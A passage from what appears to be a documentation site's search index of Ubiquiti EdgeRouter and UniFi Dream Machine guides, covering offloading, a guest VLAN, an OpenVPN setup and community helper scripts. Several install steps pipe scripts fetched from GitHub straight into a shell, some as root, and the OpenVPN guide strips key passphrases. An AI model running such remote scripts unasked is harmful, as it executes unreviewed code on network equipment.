system offload ipsec enable\n\ncommit ; save\n</code></pre> <p>Disable hwnat and ipsec offloading.</p> <pre><code>configure\n\nset system offload hwnat disable\nset system offload ipsec disable\n\ncommit ; save\n</code></pre> <p>For Devices: ER-4 / ER-6P / ERLite-3 / ERPoE-5 / ER-8 / ERPro-8 / EP-R8 / ER-8-XG Enable IPv4/IPv6 and ipsec offloading.</p> <pre><code>configure\n\nset system offload ipv4 forwarding enable\nset system offload ipv4 gre enable\nset system offload ipv4 pppoe enable\nset system offload ipv4 vlan enable\n\nset system offload ipv6 forwarding enable\nset system offload ipv6 pppoe enable\nset system offload ipv6 vlan enable\n\nset system offload ipsec enable\n\ncommit ; save\n</code></pre> <p>Disable IPv4/IPv6 and ipsec offloading.</p> <pre><code>configure\n\nset system offload ipv4 forwarding disable\nset system offload ipv4 gre disable\nset system offload ipv4 pppoe disable\nset system offload ipv4 vlan disable\n\nset system offload ipv6 forwarding disable\nset system offload ipv6 pppoe disable\nset system offload ipv6 vlan disable\n\nset system offload ipsec disable\n\ncommit ; save\n</code></pre>", "tags": ["ubiquiti", "edgerouter"]}, {"location": "infrastructure/ubiquiti/edge-router/#disable-update-etchosts-file-on-edgerouter", "title": "Disable, Update /etc/hosts file on EdgeRouter", "text": "<p>Disable Auto DHCP hots:</p> <pre><code>configure\nset service dhcp-server hostfile-update disablecommit\ncommit ; save\n</code></pre> <p>Update the Host File Manually:</p> <pre><code>configure\nset system static-host-mapping host-name mydomain.com inet 192.168.1.10\ncommit ; save\n</code></pre> <p>Show DNS Forwarding</p> <pre><code>configure\nshow service dns forwarding\n</code></pre> <p>Show Hosts Config</p> <pre><code>cat /etc/hosts\n</code></pre>", "tags": ["ubiquiti", "edgerouter"]}, {"location": "infrastructure/ubiquiti/edge-router/#guest-wifi-with-ubiquiti-edgerouter-and-unifi-access-points", "title": "Guest Wifi With Ubiquiti EdgeRouter and Unifi Access Points", "text": "", "tags": ["ubiquiti", "edgerouter"]}, {"location": "infrastructure/ubiquiti/edge-router/#edgerouter-configuration", "title": "EdgeRouter Configuration", "text": "<p>From the Dashboard, click Add Interface and select VLAN.</p> <p></p> <p>Set up the VLAN ID as You like for this example will use id 1003 and attach it to the physical interface of your LAN. Give it an IP address in the range of a private IP block, but make sure you end it in a /24 to specify the proper subnet (I originally did /32 as I though it was supposed to be the exact IP address).</p> <p></p> <p>Click on the Services tab. Click Add DHCP Server. Set it up similar to the image below.</p> <p></p> <p>Click on the DNS tab under services. Click Add Listen interface and select the VLAN interface. Make sure you hit save.</p> <p></p> <p>At this point, you should be able to connect to your Guest Network and connect to the Internet. However, you\u2019ll be able to access the EdgeRouter as well as other devices on your LAN. Next thing you have to do is secure the VLAN.</p> <p>Click on Firewall/NAT and then click on Add Ruleset. This is for packets coming into the router destined for somewhere else (not the router). Set up the default policy for Accept. Click Save.</p> <p></p> <p>From the Actions menu next to the Ruleset, click Interfaces.</p> <p></p> <p>Select your VLAN interface and the in direction.</p> <p></p> <p>Click Rules and then Add New Rule. Click on Basic and name it LAN. Select Drop as the Action.</p> <p></p> <p>Click Destination and enter 10.0.1.0/24 or whatever your LAN IP range is. Then click Save. This will drop all packets from the VLAN destined for your LAN. Save.</p> <p></p> <p>Repeat 1 and 2 above (name it GUEST_LOCAL). From the Interface, select the VLAN interface and the local direction. However, set up the default policy as Drop.</p> <p>Add a new rule. Set it to Accept on UDP port 53.</p> <p></p> <p></p> <p>Save. Let's continue to set up the Uifi AP</p>", "tags": ["ubiquiti", "edgerouter"]}, {"location": "infrastructure/ubiquiti/edge-router/#unifi-configuration", "title": "Unifi Configuration", "text": "<p>If you want to limit your Guest Users Bandwidth, head over to User Groups and create a new user group called Guest. Enter bandwidth limits that are appropriate for your Internet Speed. I used 6000 down and 2500 up.</p> <p></p> <p>Now go to the Wireless Networks section and create a new network called \u201cGuest\u201d or whatever you want to call it.</p> <p>Make sure it is enabled, give it WiFi security key, check the \u201cGuest Policy\u201d option, enter the VLAN Id you used previously and choose the Guest User Group. Save!</p> <p></p> <p>Done. Test Your New Guest Wifi by connecting to the Guest Wifi and browse to a website.</p>", "tags": ["ubiquiti", "edgerouter"]}, {"location": "infrastructure/ubiquiti/edge-router/#edgerouter-openvpn-configuration-443tcp", "title": "EdgeRouter OpenVPN Configuration 443/TCP", "text": "<p>This Guide is based on Original guide form ubnt support with modifications to the VPN port and protocol</p> <p>For the purpose of this article, it is assumed that the routing and interface configurations are already in place and that reachability has been tested.</p> <p>ssh to the EdgeRouter</p> <p>Make sure that the date/time is set correctly on the EdgeRouter.</p> <pre><code>show date\nThu Dec 28 14:35:42 UTC 2017\n</code></pre> <p>Log in as the root user.</p> <pre><code>sudo su\n</code></pre> <p>Generate a Diffie-Hellman (DH) key file and place it in the /config/auth directory. This Will take some time...</p> <pre><code>openssl dhparam -out /config/auth/dh.pem -2 4096\n</code></pre> <p>Change the current directory.</p> <pre><code>cd /usr/lib/ssl/misc\n</code></pre> <p>Generate a root certificate (replace  with your desired passphrase). <pre><code>./CA.pl -newca\n</code></pre> <p>exmaple:</p> <p>PEM Passphrase:  Country Name: <code>US</code> <p>State Or Province Name: <code>New York</code></p> <p>Locality Name: <code>New York</code></p> <p>Organization Name: <code>Ubiquiti</code></p> <p>Organizational Unit Name: <code>Support</code></p> <p>Common Name: <code>root</code></p> <p>Email Address: <code>support@ubnt.com</code></p> <p><code>NOTE: The Common Name needs to be unique for all certificates.</code></p> <p>Copy the newly created certificate + key to the /config/auth directory.</p> <pre><code>cp demoCA/cacert.pem /config/auth\ncp demoCA/private/cakey.pem /config/auth\n</code></pre> <p>Generate the server certificate.</p> <pre><code>./CA.pl -newreq\n</code></pre> <p>exmaple:</p> <p>Country Name: <code>US</code></p> <p>State Or Province Name: <code>New York</code></p> <p>Locality Name: <code>New York</code></p> <p>Organization Name: <code>Ubiquiti</code></p> <p>Organizational Unit Name: <code>Support</code></p> <p>Common Name: <code>server</code></p> <p>Email Address: <code>support@ubnt.com</code></p> <p>Sign the server certificate.</p> <p>if you want to change the certificate expiration day use: export default_days=\"3650\" with the value of days you desire</p> <pre><code>./CA.pl -sign\n</code></pre> <p>Move and rename the server certificate + key to the /config/auth directory.</p> <pre><code>mv newcert.pem /config/auth/server.pem\nmv newkey.pem /config/auth/server.key\n</code></pre> <p>Generate, sign and move the client1 certificates.</p> <pre><code>./CA.pl -newreq\n</code></pre> <p>Common Name: client1</p> <pre><code>./CA.pl -sign\nmv newcert.pem /config/auth/client1.pem\nmv newkey.pem /config/auth/client1.key\n</code></pre> <p>(Optional) Repeat the process for client2.</p> <pre><code>./CA.pl -newreq\n</code></pre> <p>Common Name: client2</p> <pre><code>./CA.pl -sign\nmv newcert.pem /config/auth/client2.pem\nmv newkey.pem /config/auth/client2.key\n</code></pre> <p>Verify the contents of the /config/auth directory.</p> <pre><code>ls -l /config/auth\n</code></pre> <p>You should have those files:</p> <ul> <li>cacert.pem</li> <li>cakey.pem</li> <li>client1.key</li> <li>client1.pem</li> <li>client2.key</li> <li>client2.pem</li> <li>dh.pem</li> <li>server.key</li> <li>server.pem</li> </ul> <p>Remove the password from the client + server keys. This allows the clients to connect using only the provided certificate.</p> <pre><code>openssl rsa -in /config/auth/server.key -out /config/auth/server-no-pass.key\nopenssl rsa -in /config/auth/client1.key -out /config/auth/client1-no-pass.key\nopenssl rsa -in /config/auth/client2.key -out /config/auth/client2-no-pass.key\n</code></pre> <p>Overwrite the existing keys with the no-pass versions.</p> <pre><code>mv /config/auth/server-no-pass.key /config/auth/server.key\nmv /config/auth/client1-no-pass.key /config/auth/client1.key\nmv /config/auth/client2-no-pass.key /config/auth/client2.key\n</code></pre> <p>Return to operational mode.</p> <pre><code>exit\n</code></pre> <p>Enter configuration mode.</p> <pre><code>configure\n</code></pre> <p>If EdgeRouter's Interface is on port 433, you must change it.</p> <pre><code>set service gui https-port 8443\ncommit ; save\n</code></pre> <p>Add a firewall rule for the OpenVPN traffic to the local firewall policy.</p> <pre><code>set firewall name WAN_LOCAL rule 30 action accept\nset firewall name WAN_LOCAL rule 30 description OpenVPN\nset firewall name WAN_LOCAL rule 30 destination port 443\nset firewall name WAN_LOCAL rule 30 protocol tcp\n</code></pre> <p>Configure the OpenVPN virtual tunnel interface. push-route - the router for vpn connection name-server - default gateway of the route above</p> <pre><code>set interfaces openvpn vtun0 mode server\nset interfaces openvpn vtun0 server subnet 172.16.1.0/24\nset interfaces openvpn vtun0 server push-route 192.168.100.0/24\nset interfaces openvpn vtun0 server name-server 192.168.100.1\nset interfaces openvpn vtun0 openvpn-option --duplicate-cn\nset interfaces openvpn vtun0 local-port 443\nedit interfaces openvpn vtun0\nset openvpn-option \"--push redirect-gateway\"\nset protocol tcp-passive\ncommit ; save\n</code></pre> <p>Link the server certificate/keys and DH key to the virtual tunnel interface.</p> <pre><code>set interfaces openvpn vtun0 tls ca-cert-file /config/auth/cacert.pem\nset interfaces openvpn vtun0 tls cert-file /config/auth/server.pem\nset interfaces openvpn vtun0 tls key-file /config/auth/server.key\nset interfaces openvpn vtun0 tls dh-file /config/auth/dh.pem\ncommit ; save\n</code></pre> <p>Add DNS forwarding to the new vlan vtun0 to get DNS resolving.</p> <p></p>", "tags": ["ubiquiti", "edgerouter"]}, {"location": "infrastructure/ubiquiti/edge-router/#exmaple-for-clinetopvn-config", "title": "Exmaple for clinet.opvn Config", "text": "<pre><code>client\ndev tun\nproto udp\nremote &lt;server-ip or hostname&gt; 443\nfloat\nresolv-retry infinite\nnobind\npersist-key\npersist-tun\nverb 3\nca cacert.pem\ncert client1.pem\nkey client1.key\n</code></pre>", "tags": ["ubiquiti", "edgerouter"]}, {"location": "infrastructure/ubiquiti/edge-router/#edgerouter-free-up-space-by-cleaning-old-firmware", "title": "EdgeRouter Free Up space by Cleaning Old Firmware", "text": "<p>ssh to the EdgeRouter:</p> <pre><code>delete system image\n</code></pre>", "tags": ["ubiquiti", "edgerouter"]}, {"location": "infrastructure/ubiquiti/edge-router/#speedtest-cli-on-edge-router", "title": "SpeedTest Cli on Edge Router", "text": "<p>ssh to the Edge Router. installation:</p> <pre><code>curl -Lo speedtest-cli https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py\nchmod +x speedtest-cli\n</code></pre> <p>run from the same directory:</p> <pre><code>./speedtest-cli --no-pre-allocate\n</code></pre> <p>based on https://github.com/sivel/speedtest-cli</p>", "tags": ["ubiquiti", "edgerouter"]}, {"location": "infrastructure/ubiquiti/edge-router/#enable-netflow-on-edgerouter-to-unms", "title": "Enable NetFlow on EdgeRouter to UNMS", "text": "<p>The most suitable place to enable NetFlow is your Default gateway router. UNMS supports NetFlow version 5 and 9. UNMS only record flow data for IP ranges defined below. Whenever UNMS receives any data from a router, the status of NetFlow changes to <code>Active</code> .</p> <p>To show interfaces and pick the right interface:\\</p> <pre><code>show interfaces\n</code></pre> <p>Example configuration for EdgeRouter:</p> <pre><code>configure\nset system flow-accounting interface pppoe0\nset system flow-accounting ingress-capture post-dnat\nset system flow-accounting disable-memory-table\nset system flow-accounting netflow server 192.168.1.10 port 2055\nset system flow-accounting netflow version 9\nset system flow-accounting netflow engine-id 0\nset system flow-accounting netflow enable-egress engine-id 1\nset system flow-accounting netflow timeout expiry-interval 60\nset system flow-accounting netflow timeout flow-generic 60\nset system flow-accounting netflow timeout icmp 60\nset system flow-accounting netflow timeout max-active-life 60\nset system flow-accounting netflow timeout tcp-fin 10\nset system flow-accounting netflow timeout tcp-generic 60\nset system flow-accounting netflow timeout tcp-rst 10\nset system flow-accounting netflow timeout udp 60\ncommit\nsave\n</code></pre> <p>10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 100.64.0.0/10</p>", "tags": ["ubiquiti", "edgerouter"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/cli-commands/", "title": "UDM CLI Commands List", "text": "<p>Collection of CLI commands for the Ubiquiti Unifi Dream Machine or Dream Machine Pro.</p>", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/cli-commands/#common-udm-commands", "title": "Common UDM Commands", "text": "<p>Open shell to unifi podman container (udm pro)</p> <pre><code>unifi-os shell\n</code></pre> <p>Show Sensors information including: UDM temperature, fan speed, and voltage.</p> <pre><code>sensors\n</code></pre> <p>Show ARP Table</p> <pre><code>arp -a\n</code></pre> <p>Display All Listening Ports on the UDM Device</p> <pre><code>netstat -plant\n</code></pre>", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/cli-commands/#udm-commands-list", "title": "UDM Commands List", "text": "<p>Collection of commands for your Unifi Dream Machine or Dream Machine Pro.</p> Description UDM/UDM-P SSH Command show DHCP leases (to NSname) cat /mnt/data/udapi-config/dnsmasq.lease show version info show system hardware and installed software ubnt-device-info summary show cpu tempeture ubnt-systool cputemp show fan speed ubnt-fan-speed show uptime uptime show ip route netstat -rt -n show ppp summery pppstats show current user whoami show log cat /var/log/messages show interface summary ifstat show interfaces ifconfig show other Ubiquiti devices on local LAN segment (ubnt-discovery) ubnt-tools ubnt-discover show config (wireless) cat /mnt/data/udapi-config/unifi packet capture tcpdump shutdown poweroff reload reboot show ipsec sa ipsec statusall factory reset factory-reset.sh show system burnt in MAC address ubnt-tools hwaddr show unifi server logs cat /mnt/data/unifi-os/unifi/logs/server.log show unifi server setttings cat /mnt/data/unifi-os/unifi-core/config/settings.yaml show unifi server http logs cat /mnt/data/unifi-os/unifi-core/logs/http.log show unifi server http logs (errors) cat /mnt/data/unifi-os/unifi-core/logs/errors.log show unifi server discovery log cat /mnt/data/unifi-os/unifi-core/logs/discovery.log show unifi system logs cat /mnt/data/unifi-os/unifi-core/logs/system.log Restarts the UnifiOS Web interface /etc/init.d/S95unifios restart show ip arp (show arp) and IPv6 neighbours arp -a OR ip neigh show tunnel interfaces ip tunnel show Show Sensors information sensors Open shell to unifi podman container unifi-os shell tcpdump tcpdump  -w", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/failover-telegram-notifications/", "title": "UDM WAN Failover Telegram Notifications", "text": "<p>This script will send a message to a Telegram chat when WAN connection is changed to failover and back to normal.</p> <p>Github Repository: UDM Failover Telegram Notifications</p>", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/failover-telegram-notifications/#changelog", "title": "Changelog", "text": "<ul> <li>2023-02-22 - Added support for multiple UDM versions 1.x, 2.x and 3.x</li> </ul>", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/failover-telegram-notifications/#persistence-on-reboot", "title": "Persistence on Reboot", "text": "<p>This script need to run every time the system is rebooted since the UDM overwrites crons every boot. This can be accomplished with a boot script. Flow this guide: UDM / UDMPro Boot Script</p>", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/failover-telegram-notifications/#compatibility", "title": "Compatibility", "text": "<ul> <li>Tested on UDM PRO</li> </ul>", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/failover-telegram-notifications/#installation", "title": "Installation", "text": "<pre><code>curl -s https://raw.githubusercontent.com/fire1ce/UDM-Failover-Telegram-Notifications/main/install.sh | sh\n</code></pre> <p>Set your Telegram Chat ID and Bot API Key at</p> <p>$DATA_DIR for 1.x = /mnt/data $DATA_DIR for 2.x and 3.x = /data</p> <pre><code>$DATA_DIR/UDMP-Failover-Telegram-Notifications/failover-notifications.sh\n</code></pre>", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/failover-telegram-notifications/#config", "title": "Config", "text": "Parameters Description telegram_bot_API_Token Telegram Bot API Token telegram_chat_id Chat ID of the Telegram Bot echo_server_ip IP of a server to test what interface is active (Default 1.1.1.1) run_interval Interval to run a failover check (Default 60 seconds)", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/failover-telegram-notifications/#uninstall", "title": "Uninstall", "text": "<p>Delete the UDMP-Failover-Telegram-Notifications folder</p> <pre><code>rm -rf $DATA_DIR/UDMP-Failover-Telegram-Notifications\n</code></pre> <p>Delete on boot script file</p> <pre><code>rm -rf $DATA_DIR/on_boot.d/99-failover-telegram-notifications.sh\n</code></pre>", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/failover-telegram-notifications/#usage", "title": "Usage", "text": "<p>At boot the script with create a cronjob that will run once. This is done to prevent boot blocking.</p> <p>Manual run to test notifications:</p> <pre><code>$DATA_DIR/UDMP-Failover-Telegram-Notifications/failover-notifications.sh\n</code></pre> <p>It's strongly recommended to perform a reboot in order to check the on boot initialization of the notifications</p>", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/persistent-boot-script/", "title": "Persistent On Boot Script", "text": "<p>When UDM or UDM PRO reboots or the firmawre is updated the custom changes you made will be lost. This Script will allow you to initialize your custom changes on every boot or firmware update. without losing your custom changes.</p> <p>Github Repository: unifios-utilities - on-boot-script</p>", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/persistent-boot-script/#features", "title": "Features", "text": "<ol> <li>Allows you to run a shell script at S95 anytime your UDM starts / reboots</li> <li>Persists through reboot and firmware updates! It is able to do this because Ubiquiti caches all debian package installs on the UDM in /data, then re-installs them on reset of unifi-os container.</li> </ol>", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/persistent-boot-script/#install", "title": "Install", "text": "<p>You can execute in UDM/Pro/SE and UDR with:</p> <pre><code>curl -fsL \"https://raw.githubusercontent.com/unifi-utilities/unifios-utilities/HEAD/on-boot-script/remote_install.sh\" | /bin/bash\n</code></pre> <p>This is a force to install script so will uninstall any previous version and install on_boot keeping your on boot files.</p> <p>This will also install CNI Plugins &amp; CNI Bridge scripts. If you are using UDMSE/UDR remember that you must install podman manually because there is no podman.</p> <p>For manual installation see: The Github Readme</p>", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/persistent-ssh-keys/", "title": "UDM Persistent SSH Keys", "text": "<p>UDM will discard any Authorized Keys for SSH every reboot or firmware upgrade. This script will allow you to persist your SSH keys in the UDM and survive reboots.</p> <p>Github Repository: UDM Persistent SSH Keys</p>", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/persistent-ssh-keys/#changelog", "title": "Changelog", "text": "<ul> <li>2023-02-22 - Fixed support for UDM Pro Firmware 1.x and 2.x and 3.x - Must reinstall the script after upgrade from 1.x to 2.x</li> </ul>", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/persistent-ssh-keys/#persistence-on-reboot", "title": "Persistence on Reboot", "text": "<p>This script need to run every time the system is rebooted since the /root/.ssh/authorized_keys overwrites every boot. This can be accomplished with a boot script. Flow this guide: UDM / UDMPro Boot Script</p>", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/persistent-ssh-keys/#compatibility", "title": "Compatibility", "text": "<ul> <li>Tested on UDM PRO</li> <li>UDM Pro doesn't support ed25519 SSH Keys</li> </ul>", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/persistent-ssh-keys/#installation", "title": "Installation", "text": "<p>The script was tested on UDM PRO</p> <p>(!) Depending on firmware your <code>$DATA_DIR</code> will be <code>/mnt/data</code> (Firmware 1.x) or <code>/data</code> (Firmware 2.x and 3.x)</p> <pre><code>curl -s https://raw.githubusercontent.com/fire1ce/UDM-Persistent-SSH-Keys/main/install.sh | sh\n</code></pre> <p>Add you public RSA keys to:</p> <pre><code>$DATA_DIR/ssh/authorized_keys\n</code></pre>", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/persistent-ssh-keys/#uninstall", "title": "Uninstall", "text": "<p>Delete the 99-ssh-keys.sh file</p> <pre><code>rm -rf $DATA_DIR/on_boot.d/99-ssh-keys.sh\n</code></pre> <p>Delete your authorized_keys file</p> <pre><code>rm -rf $DATA_DIR/ssh/authorized_keys\n</code></pre>", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/persistent-ssh-keys/#usage", "title": "Usage", "text": "<p>At boot the script with read the $DATA_DIR/ssh/authorized_keys file and add the content to UDM's /root/.ssh/authorized_keys</p> <p>Manual run:</p> <pre><code>$DATA_DIR/on_boot.d/99-ssh-keys.sh\n</code></pre>", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/udm-better-fan-speeds/", "title": "UDM Better Fan Speeds", "text": "<p>Github Repository: UDM Better Fan Speeds</p>", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/udm-better-fan-speeds/#repository-deprecation-notice", "title": "Repository Deprecation Notice", "text": "<p> Repository Deprecation Notice: This project is now deprecated and archived due to the release of UniFi's firmware v2.x and v3.x for Dream Machnines, which natively fix the fan speed issues.</p> <p>This repository only works with firmware 1.x. UDM-PRO Please consider upgrading your firmware for improved functionality.</p>", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/udm-better-fan-speeds/#what-it-does", "title": "What It Does", "text": "<p>It stops the build in service that monitors the thermal values, fan speed and connection of a HDD/SSD. After that it sets the thermal/fan chip (adt7475) to automatic mode. Once that is done it changes the thermal and fan threshold values specified in the script. If you like, you can change the values to your own preferences.</p>", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/udm-better-fan-speeds/#compatibility", "title": "Compatibility", "text": "<ul> <li>Tested on UDM PRO</li> </ul>", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/udm-better-fan-speeds/#warning", "title": "WARNING", "text": "<p>USE THIS ON YOUR OWN RISK. If you apply inappropriate settings with this script, you will possibly (soft- or hard-) brick your equipment.</p>", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/udm-better-fan-speeds/#requirements", "title": "Requirements", "text": "<p>Persistence on Reboot is required. This can be accomplished with a boot script. Flow this guide: UDM Boot Script</p>", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/udm-better-fan-speeds/#installation", "title": "Installation", "text": "<pre><code>curl -s https://raw.githubusercontent.com/fire1ce/UDM-Better-Fan-Speeds/main/install.sh | sh\n</code></pre>", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/udm-better-fan-speeds/#configuration", "title": "Configuration", "text": "<p>You can edit the fan-speed settings at</p> <pre><code>/mnt/data/on_boot.d/11-udm-better-fan-speed.sh\n</code></pre>", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/udm-better-fan-speeds/#credit", "title": "Credit", "text": "<p>Based on renedis/ubnt-auto-fan-speed by ReneDIS. Thanks</p>", "tags": ["udm", "ubiquiti", "unifi"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/udm-cloudflare-ddns/", "title": "UDM Cloudflare DDNS", "text": "<p>Github Repository: UDM Cloudflare DDNS</p>", "tags": ["udm", "ubiquiti", "unifi", "cloudflare"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/udm-cloudflare-ddns/#change-log", "title": "Change Log", "text": "<ul> <li>2024-07-02 - Added support for Unifi OS v4.x</li> <li>2023-12-14 - Updated installation and uninstallation scripts for better user experience, flexibility, and removed support for v1.x firmware versions.</li> <li>2023-02-10 - Major Update for UDM v2.x and v3.x</li> </ul>", "tags": ["udm", "ubiquiti", "unifi", "cloudflare"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/udm-cloudflare-ddns/#what-it-does", "title": "What It Does", "text": "<p>This project provides a script to set up a DDNS (Dynamic DNS) service using Cloudflare as the DNS provider on Ubiquiti's UDM devices. The script sets up a systemd service and timer to handle DDNS updates for your main internet IP address at regular intervals.</p>", "tags": ["udm", "ubiquiti", "unifi", "cloudflare"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/udm-cloudflare-ddns/#compatibility", "title": "Compatibility", "text": "<ul> <li>Tested on UDM PRO with UDM OS v3.2.7</li> </ul>", "tags": ["udm", "ubiquiti", "unifi", "cloudflare"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/udm-cloudflare-ddns/#requirements", "title": "Requirements", "text": "<ul> <li>UDM OS 2.x or 3.x</li> <li>ssh root access to the UDM</li> <li>Cloudflare API Toke</li> </ul>", "tags": ["udm", "ubiquiti", "unifi", "cloudflare"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/udm-cloudflare-ddns/#creating-a-cloudflare-api-token", "title": "Creating a Cloudflare API token", "text": "<p>To create a CloudFlare API token for your DNS zone go to https://dash.cloudflare.com/profile/api-tokens and follow these steps:</p> <ol> <li>Click Create Token</li> <li>Select Create Custom Token</li> <li>Provide the token a name, for example, <code>example.com-dns-zone</code></li> <li>Grant the token the following permissions:    - Zone - DNS - Edit</li> <li>Set the zone resources to:    - Include - Specific Zone - <code>example.com</code></li> <li>Complete the wizard.</li> <li>Use the generated token at the <code>API_KEY</code> variable for the container</li> </ol>", "tags": ["udm", "ubiquiti", "unifi", "cloudflare"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/udm-cloudflare-ddns/#installation", "title": "Installation", "text": "<p>Run the following command to install the Cloudflare DDNS service as root on your UDM:</p> <pre><code>sudo curl -s -o install.sh https://raw.githubusercontent.com/fire1ce/UDM-Cloudflare-DDNS/main/install.sh\nsudo chmod +x install.sh\nsudo ./install.sh\n</code></pre> <p>This script will:</p> <p>Determine the appropriate data directory. Download and install the DDNS script and configuration file. Set up a systemd service and timer to run the DDNS script at regular intervals (configurable by the user).</p>", "tags": ["udm", "ubiquiti", "unifi", "cloudflare"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/udm-cloudflare-ddns/#configuration", "title": "Configuration", "text": "<p>After installation, you can find and edit the configuration file typically located at <code>/data/cloudflare-ddns/update-cloudflare-dns.conf</code> or <code>/mnt/data/cloudflare-ddns/update-cloudflare-dns.conf</code>, depending on your UDM model and firmware version. Update this file with your Cloudflare details.</p>", "tags": ["udm", "ubiquiti", "unifi", "cloudflare"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/udm-cloudflare-ddns/#uninstallation", "title": "Uninstallation", "text": "<p>To uninstall the Cloudflare DDNS service, you will need to run an uninstallation script that:</p> <p>Stops and disables the systemd service and timer. Removes the DDNS script, configuration files, and systemd files. Optionally removes log files, if generated by the service.</p> <p>Run the following command to uninstall the Cloudflare DDNS service as root on your UDM:</p> <pre><code>sudo curl -s https://raw.githubusercontent.com/fire1ce/UDM-Cloudflare-DDNS/main/uninstall.sh | bash\n</code></pre>", "tags": ["udm", "ubiquiti", "unifi", "cloudflare"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/udm-cloudflare-ddns/#acknowledgments", "title": "Acknowledgments", "text": "<p>This UDM-Cloudflare-DDNS project is based on the DDNS-Cloudflare-Bash script by the same author. It has been adapted and extended specifically for use with Ubiquiti's UDM devices.</p>", "tags": ["udm", "ubiquiti", "unifi", "cloudflare"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/wireguard-vpn/", "title": "Wireguard VPN", "text": "<p>WireGuard\u00ae is an extremely simple yet fast and modern VPN that utilizes state-of-the-art cryptography. It aims to be faster, simpler, leaner, and more useful than IPsec, while avoiding the massive headache. It intends to be considerably more performant than OpenVPN. WireGuard is designed as a general purpose VPN for running on embedded interfaces and super computers alike, fit for many different circumstances. Initially released for the Linux kernel, it is now cross-platform (Windows, macOS, BSD, iOS, Android) and widely deployable. It is currently under heavy development, but already it might be regarded as the most secure, easiest to use, and simplest VPN solution in the industry.</p> <p>Github Repository: wireguard-vyatta-ubnt</p> <p>A guide on installing and using the WireGuard kernel module and tools on Ubiquiti UnifiOS routers (UDM, UDR, and UXG).</p>", "tags": ["udm", "ubiquiti", "unifi", "wireguard"]}, {"location": "infrastructure/ubiquiti/udm-dream-machine/wireguard-vpn/#installation", "title": "Installation", "text": "<ol> <li> <p>Download the latest release for UnifiOS. Use the correct link in the command below</p> <pre><code>curl -Lfo UnifiOS-wireguard.tar.gz https://github.com/WireGuard/wireguard-vyatta-ubnt/releases/download/${RELEASE}/UnifiOS-${RELEASE}.tar.gz\n</code></pre> </li> <li> <p>Extract the files to your data directory and run the setup script.</p> <ul> <li> <p>For the UDM/P or UXG-Pro, extract the files into <code>/mnt/data/wireguard</code></p> <pre><code>tar -C /mnt/data -xvf UnifiOS-wireguard.tar.gz\n/mnt/data/wireguard/setup_wireguard.sh\n</code></pre> </li> <li> <p>For the UDM-SE or UDR, extract the files into <code>/data/wireguard</code></p> <pre><code>tar -C /data -xvf UnifiOS-wireguard.tar.gz\n/data/wireguard/setup_wireguard.sh\n</code></pre> </li> </ul> </li> <li> <p>The setup script will load the wireguard module, and setup the symbolic links for the wireguard tools (wg-quick and wg). You can run <code>dmesg</code> to verify the kernel module was loaded. You should see something like the following: </p> <pre><code>[13540.520120] wireguard: WireGuard 1.0.20210219 loaded. See www.wireguard.com for information.\n[13540.520126] wireguard: Copyright (C) 2015-2019 Jason A. Donenfeld &lt;Jason@zx2c4.com&gt;. All Rights Reserved.\n</code></pre> 